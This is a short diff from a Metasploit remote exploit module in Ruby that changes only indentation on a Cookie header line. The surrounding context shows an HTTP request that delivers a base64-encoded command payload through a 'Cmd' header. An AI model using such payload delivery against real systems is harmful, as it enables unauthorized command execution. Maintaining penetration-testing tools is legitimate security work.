@@ -117,7 +117,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'vars_post' => data,
       'headers' => {
         'Connection': 'close',
-	'Cookie': cookie.to_s,
+        'Cookie': cookie.to_s,
         'Cmd': payload_b64
       }
     })
